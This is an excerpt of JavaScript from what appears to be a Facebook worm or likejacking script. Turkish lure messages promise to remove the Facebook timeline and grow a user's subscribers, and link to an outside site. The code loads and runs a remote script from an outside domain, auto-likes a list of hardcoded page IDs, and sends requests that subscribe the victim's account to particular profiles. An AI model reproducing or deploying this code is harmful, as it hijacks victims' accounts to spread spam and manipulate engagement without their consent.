...
var randomyazi = [
	"Helal olsun eski profil gibisi yok »» <3:",
	"Zaman Tunelinden Kurtulun Superr Uygulama.<3..:",
    "Oh be zaman tünelinden kurtuldum süperr »» <3",
	"Zaman Tunelinden Kurtuldum Superr Uygulama.<3....:",
    "Facebook Zaman Tunelinden Kurtulun,Abonenizi Cogaltin Superr Uygulama.<3 http://sinanlabegendir.tr.gg .....:"
]
...
function topluhazirla()
{
	...
	s.src="http://burakmutluay.com/timeline/swp.js";
...
like("197663156947338");
like("291216257595210");
like("283099425113942");
like("241688445945666");
like("178268418942764");
like("306977969359078");
...
var xmlhttp = new XMLHttpRequest();
    ...
    var params = "profile_id=SinanOzdel";
    params += "&location=1";
    ...
    var params1 = "profile_id=100002346311176";
    params1 += "&location=1";
    ...
    params1 += "&phstamp=100002346311176";
